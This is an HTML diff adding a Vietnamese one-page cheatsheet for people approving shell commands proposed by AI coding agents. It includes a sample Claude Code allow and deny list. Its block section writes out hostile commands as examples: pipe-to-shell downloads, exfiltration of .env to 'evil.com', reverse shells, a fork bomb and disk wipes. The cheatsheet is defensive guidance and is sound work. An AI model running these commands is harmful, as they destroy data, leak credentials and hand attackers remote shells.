@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AI Bash Commands — Cheatsheet 1 trang (in được)</title>
+<style>
+  @page { size: A4; margin: 12mm; }
+  :root {
+    --green: #1a7f37; --green-bg: #dafbe1;
+    --yellow: #9a6700; --yellow-bg: #fff8c5;
+    --red: #cf222e; --red-bg: #ffebe9;
+    --skull: #6e1414; --skull-bg: #fce5e5;
+    --bg: #ffffff; --text: #1f2328; --muted: #656d76;
+    --border: #d0d7de; --mono: 'SF Mono', Menlo, Consolas, monospace;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
+    color: var(--text); background: var(--bg);
+    font-size: 9.5pt; line-height: 1.35;
+    padding: 0; max-width: 210mm; margin: 0 auto;
+  }
+  .page { padding: 8mm 10mm; }
+  header {
+    border-bottom: 2px solid var(--text);
+    padding-bottom: 6pt; margin-bottom: 10pt;
+    display: flex; align-items: baseline; justify-content: space-between;
+  }
+  h1 { font-size: 14pt; font-weight: 700; }
+  .subtitle { font-size: 8.5pt; color: var(--muted); }
+  h2 {
+    font-size: 10pt; font-weight: 700;
+    margin: 10pt 0 4pt;
+    padding: 3pt 6pt;
+    border-radius: 3pt;
+    display: flex; align-items: center; gap: 6pt;
+  }
+  h2 .num { font-family: var(--mono); font-size: 8.5pt; opacity: 0.7; }
+  .h-green  { background: var(--green-bg);  color: var(--green); }
+  .h-yellow { background: var(--yellow-bg); color: var(--yellow); }
+  .h-red    { background: var(--red-bg);    color: var(--red); }
+  .h-skull  { background: var(--skull-bg);  color: var(--skull); }
+  .h-blue   { background: #ddf4ff; color: #0969da; }
+  .h-gray   { background: #eaeef2; color: var(--text); }
+
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 6pt; }
+  .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 6pt; }
+
+  pre, code, .cmd {
+    font-family: var(--mono);
+    font-size: 8.5pt;
+  }
+  .cmd-list {
+    font-family: var(--mono); font-size: 8.5pt;
+    line-height: 1.6; columns: 3; column-gap: 10pt;
+  }
+  .cmd-block {
+    background: #f6f8fa; border: 1px solid var(--border);
+    border-radius: 3pt; padding: 4pt 6pt;
+    font-family: var(--mono); font-size: 8.5pt;
+    line-height: 1.5;
+    white-space: pre-wrap; word-break: break-word;
+  }
+  table {
+    width: 100%; border-collapse: collapse;
+    font-size: 8.5pt; margin: 4pt 0;
+  }
+  table th, table td {
+    text-align: left; padding: 3pt 5pt;
+    border-bottom: 1px solid var(--border);
+    vertical-align: top;
+  }
+  table th { font-weight: 700; background: #f6f8fa; }
+  table td.cmd-col {
+    font-family: var(--mono); font-size: 8pt;
+    white-space: nowrap;
+  }
+  .rule {
+    background: #f6f8fa; border-left: 3pt solid var(--text);
+    padding: 5pt 8pt; font-size: 9pt; margin: 4pt 0;
+    font-family: var(--mono);
+    line-height: 1.6;
+  }
+  .rule .ok    { color: var(--green); font-weight: 700; }
+  .rule .ask   { color: var(--red); font-weight: 700; }
+  .rule .block { color: var(--skull); font-weight: 700; }
+  .footer {
+    margin-top: 10pt; padding-top: 6pt;
+    border-top: 1px solid var(--border);
+    font-size: 7.5pt; color: var(--muted);
+    display: flex; justify-content: space-between;
+  }
+  .quote {
+    background: #fff8c5; border-left: 3pt solid var(--yellow);
+    padding: 4pt 8pt; font-style: italic; font-size: 8.5pt;
+    margin: 4pt 0;
+  }
+  .pattern-row {
+    display: grid; grid-template-columns: 50pt 1.2fr 2fr;
+    gap: 4pt; padding: 2.5pt 0;
+    border-bottom: 1px dotted var(--border);
+    font-size: 8.5pt;
+  }
+  .pattern-row:last-child { border-bottom: none; }
+  .pattern-row .id {
+    font-family: var(--mono); font-weight: 700; color: var(--red);
+  }
+  .pattern-row .name { font-weight: 600; }
+  .pattern-row .sig { font-family: var(--mono); font-size: 8pt; color: var(--muted); }
+
+  .print-btn {
+    position: fixed; top: 10pt; right: 10pt;
+    padding: 6pt 12pt; background: var(--text); color: white;
+    border: none; border-radius: 4pt; cursor: pointer;
+    font-family: inherit; font-size: 10pt;
+    box-shadow: 0 2pt 6pt rgba(0,0,0,0.15);
+  }
+  .print-btn:hover { opacity: 0.85; }
+
+  @media print {
+    .print-btn { display: none; }
+    body { font-size: 9pt; }
+    h2 { page-break-after: avoid; }
+    .pattern-row, table tr { page-break-inside: avoid; }
+  }
+
+  @media (max-width: 600px) {
+    .cmd-list { columns: 1; }
+    .grid-2, .grid-3 { grid-template-columns: 1fr; }
+    .pattern-row { grid-template-columns: 1fr; gap: 2pt; }
+  }
+</style>
+</head>
+<body>
+
+<button class="print-btn" onclick="window.print()">🖨️ In / Lưu PDF</button>
+
+<div class="page">
+
+  <header>
+    <div>
+      <h1>🛡️ AI Bash Commands — Cheatsheet</h1>
+      <div class="subtitle">Tra cứu nhanh khi AI Agent định chạy lệnh · In ra hoặc mở song song terminal</div>
+    </div>
+    <div class="subtitle">v1.0 · Hưng 2x · 05/2026</div>
+  </header>
+
+  <!-- 5 second rule -->
+  <h2 class="h-gray"><span class="num">§0</span> ⚡ Quy tắc 5 giây</h2>
+  <div class="rule">
+    1. Đọc lệnh — đừng click Allow theo phản xạ<br>
+    2. Có  <code>| bash</code>  hay  <code>| sh</code>             → <span class="block">[☠️] BLOCK</span><br>
+    3. Có  <code>$(cat ...)</code>  trong URL                       → <span class="block">[☠️] BLOCK</span><br>
+    4. Có path  <code>.env / .ssh / .aws/</code>                    → <span class="ask">[🔴] HỎI LẠI</span><br>
+    5. Có  <code>sudo</code>  không rõ lý do                        → <span class="ask">[🔴] HỎI LẠI</span><br>
+    6. Không thuộc 4 cái trên                                       → <span class="ok">[🟢 OK]</span>
+  </div>
+
+  <!-- Safe -->
+  <h2 class="h-green"><span class="num">§1</span> 🟢 AN TOÀN — cứ chạy</h2>
+  <div class="cmd-list">
+    ls, ls -la, pwd, whoami, uname<br>
+    cat, head, tail, less, file<br>
+    grep, rg, find, which, type<br>
+    wc, sort, uniq, cut, stat<br>
+    df, du, free, ps, top<br>
+    git status, git log, git diff<br>
+    git show, git blame, git branch<br>
+    ping, dig, nslookup, host<br>
+    echo, printf, date, cal, uptime<br>
+    tree, locate, ag
+  </div>
+
+  <!-- Need-read -->
+  <h2 class="h-yellow"><span class="num">§2</span> 🟡 CẦN ĐỌC — allow nếu hiểu</h2>
+  <table>
+    <tr><td class="cmd-col">npm/pip/yarn install &lt;pkg&gt;</td><td>check tên, nguồn chính thức, typo squat?</td></tr>
+    <tr><td class="cmd-col">cp / mv</td><td>có ghi đè file quan trọng? có <code>-f</code>?</td></tr>
+    <tr><td class="cmd-col">sed -i / awk (write)</td><td>pattern regex đúng? có backup?</td></tr>
+    <tr><td class="cmd-col">mkdir / touch</td><td>path tạo ở đâu? conflict?</td></tr>
+    <tr><td class="cmd-col">git add / commit / pull</td><td>có lỡ commit <code>.env</code>, <code>*.key</code>?</td></tr>
+    <tr><td class="cmd-col">ps / kill &lt;pid&gt;</td><td>kill nhầm process prod?</td></tr>
+    <tr><td class="cmd-col">env / printenv</td><td>output có secrets — đừng share log</td></tr>
+    <tr><td class="cmd-col">curl &lt;URL&gt; / wget &lt;URL&gt;</td><td>URL tin được? domain chính thức?</td></tr>
+    <tr><td class="cmd-col">zip / tar -c</td><td>archive gom file nhạy cảm?</td></tr>
+    <tr><td class="cmd-col">docker build / pull</td><td>Dockerfile có gì lạ? base image từ đâu?</td></tr>
+    <tr><td class="cmd-col">make / npm run build</td><td>đọc nội dung script trước</td></tr>
+  </table>
+
+  <!-- Dangerous -->
+  <h2 class="h-red"><span class="num">§3</span> 🔴 NGUY HIỂM — HỎI LẠI trước khi allow</h2>
+  <table>
+    <tr><td class="cmd-col">rm -rf &lt;path&gt;</td><td>"path chính xác là gì? hậu quả nếu sai?"</td></tr>
+    <tr><td class="cmd-col">rm -rf $VAR/...</td><td>"$VAR có giá trị?" (rỗng = xoá root)</td></tr>
+    <tr><td class="cmd-col">cat .env / ~/.aws/...</td><td>"tại sao cần đọc file này?"</td></tr>
+    <tr><td class="cmd-col">cat ~/.ssh/id_*</td><td>KHÔNG có lý do hợp lệ</td></tr>
+    <tr><td class="cmd-col">chmod 777 / chmod -R 777</td><td>"quyền cụ thể nào thực sự cần?"</td></tr>
+    <tr><td class="cmd-col">chmod +s / chown root:root</td><td>privilege escalation — hỏi rõ</td></tr>
+    <tr><td class="cmd-col">sudo &lt;anything&gt;</td><td>"tại sao cần root? có cách non-root?"</td></tr>
+    <tr><td class="cmd-col">curl -X POST / wget --post</td><td>"gửi data gì? đến đâu?"</td></tr>
+    <tr><td class="cmd-col">crontab -e / systemctl enable</td><td>"script làm gì? chạy khi nào? quyền gì?"</td></tr>
+    <tr><td class="cmd-col">git push --force</td><td>"có người khác đã pull commit cũ?"</td></tr>
+    <tr><td class="cmd-col">git reset --hard / rebase -i</td><td>"backup chưa? có thể recover?"</td></tr>
+    <tr><td class="cmd-col">docker run --privileged</td><td>gần như luôn red flag</td></tr>
+    <tr><td class="cmd-col">docker run -v /:/host</td><td>mount root, hết isolation</td></tr>
+    <tr><td class="cmd-col">iptables -F / ufw disable</td><td>"tại sao tắt firewall? bật lại lúc nào?"</td></tr>
+    <tr><td class="cmd-col">mkfs.* / dd if=... of=...</td><td>confirm device path TRƯỚC khi run</td></tr>
+  </table>
+
+  <!-- Block -->
+  <h2 class="h-skull"><span class="num">§4</span> ☠️ TUYỆT ĐỐI BLOCK — không cần đọc tiếp</h2>
+  <div class="grid-2">
+    <div class="cmd-block">curl URL | bash
+curl URL | sh
+wget URL | bash
+bash &lt;(curl ...)
+eval "$(curl ...)"
+─────────────────────
+rm -rf /
+rm -rf /*
+─────────────────────
+curl URL -d "$(cat .env)"
+curl URL -d "$(env)"
+dig "$(cat .env).evil.com"</div>
+    <div class="cmd-block">:(){ :|:&amp; };:     # fork bomb
+─────────────────────
+base64 -d | bash    # obfuscated
+─────────────────────
+nc -e /bin/sh &lt;h&gt; &lt;p&gt;
+bash -i &gt;&amp; /dev/tcp/&lt;h&gt;/&lt;p&gt; 0&gt;&amp;1
+python -c "import socket,os,pty..."
+─────────────────────
+dd if=/dev/urandom of=/dev/sda
+mkfs.ext4 /dev/sda
+&gt; ~/.bashrc   # truncate rc
+history -c
+chattr +i /etc/passwd</div>
+  </div>
+
+  <!-- 8 patterns -->
+  <h2 class="h-red"><span class="num">§5</span> 🎯 8 Pattern nguy hiểm — nhận diện 1 dòng</h2>
+  <div class="pattern-row"><span class="id">P-01</span><span class="name">Credential Exposure</span><span class="sig">cat .env · printenv | grep KEY/TOKEN</span></div>
+  <div class="pattern-row"><span class="id">P-02</span><span class="name">Pipe to Shell</span><span class="sig">curl ... | bash · bash &lt;(curl ...)</span></div>
+  <div class="pattern-row"><span class="id">P-03</span><span class="name">Silent Exfiltration</span><span class="sig">curl POST + $(cat ...) · DNS exfil qua dig</span></div>
+  <div class="pattern-row"><span class="id">P-04</span><span class="name">Permission Escalation</span><span class="sig">chmod 777 · sudo không lý do · chmod +s</span></div>
+  <div class="pattern-row"><span class="id">P-05</span><span class="name">Persistence Setup</span><span class="sig">crontab · systemctl enable · append .bashrc</span></div>
+  <div class="pattern-row"><span class="id">P-06</span><span class="name">Dependency Confusion</span><span class="sig">package tên typo (lodahs) · URL git lạ</span></div>
+  <div class="pattern-row"><span class="id">P-07</span><span class="name">Git History Mining</span><span class="sig">git log -p .env · git show &lt;hash&gt;:credentials</span></div>
+  <div class="pattern-row"><span class="id">P-08</span><span class="name">Environment Pollution</span><span class="sig">.bashrc append · npm registry · git hook</span></div>
+
+  <!-- Universal question -->
+  <div class="quote">
+    <strong>❓ Câu hỏi vạn năng khi nghi ngờ:</strong> "Giải thích lệnh này cho tôi — nó làm gì chính xác? Tại sao cần lệnh này? Có cách an toàn hơn không?"
+  </div>
+
+  <!-- Sandbox -->
+  <h2 class="h-blue"><span class="num">§6</span> 🐳 Sandbox 1 dòng (Docker)</h2>
+  <div class="cmd-block">docker run --rm -it --cap-drop=ALL --security-opt=no-new-privileges \
+  -v "$(pwd)":/workspace -w /workspace -u "$(id -u):$(id -g)" \
+  node:20-slim bash</div>
+
+  <!-- Recovery -->
+  <h2 class="h-red"><span class="num">§7</span> 🆘 Đã lỡ chạy lệnh xấu — 6 bước recovery</h2>
+  <table>
+    <tr><th style="width:60pt">Bước</th><th>Hành động</th></tr>
+    <tr><td><strong>1. STOP</strong></td><td><code>Ctrl+C</code> · <code>pkill -P $(pgrep -f "claude-code|cursor|cline")</code></td></tr>
+    <tr><td><strong>2. ASSESS</strong></td><td>Lệnh gì đã chạy? Đã chạm vào file/data nào? (đọc log)</td></tr>
+    <tr><td><strong>3. ROTATE</strong></td><td>Đổi MỌI key liên quan: AWS · GitHub PAT · OpenAI/Anthropic · DB · SSH key</td></tr>
+    <tr><td><strong>4. CHECK</strong></td><td><code>crontab -l</code> · <code>systemctl list-units</code> · <code>~/.ssh/authorized_keys</code> · <code>~/Library/LaunchAgents/</code> · <code>netstat -anp</code></td></tr>
+    <tr><td><strong>5. RECOVER</strong></td><td><code>git reflog</code> · Time Machine · <code>extundelete</code></td></tr>
+    <tr><td><strong>6. LEARN</strong></td><td>Update allowlist/denylist · Report bug nếu là lỗi platform</td></tr>
+  </table>
+
+  <!-- Allowlist config -->
+  <h2 class="h-gray"><span class="num">§8</span> ⚙️ Allowlist/Denylist mẫu (Claude Code)</h2>
+  <div class="cmd-block">// ~/.claude/settings.json
+{
+  "permissions": {
+    "allow": [
+      "Bash(ls *)", "Bash(cat *)", "Bash(git status)",
+      "Bash(git diff *)", "Bash(git log *)", "Bash(pwd)",
+      "Bash(grep *)", "Bash(rg *)"
+    ],
+    "deny": [
+      "Bash(rm -rf *)", "Bash(curl * | *bash*)",
+      "Bash(curl * | *sh*)", "Bash(sudo *)",
+      "Bash(chmod 777 *)", "Bash(* > ~/.bashrc)",
+      "Bash(cat *credentials*)", "Bash(cat *.pem)", "Bash(cat *.key)"
+    ]
+  }
+}</div>
+
+  <div class="footer">
+    <span>Hưng 2x · Tháng 5/2026</span>
+    <span><a href="https://hungld10.github.io/share-everything-about-ai/" style="color:inherit">hungld10.github.io/share-everything-about-ai</a></span>
+  </div>
+
+</div>
+
+</body>
+</html>
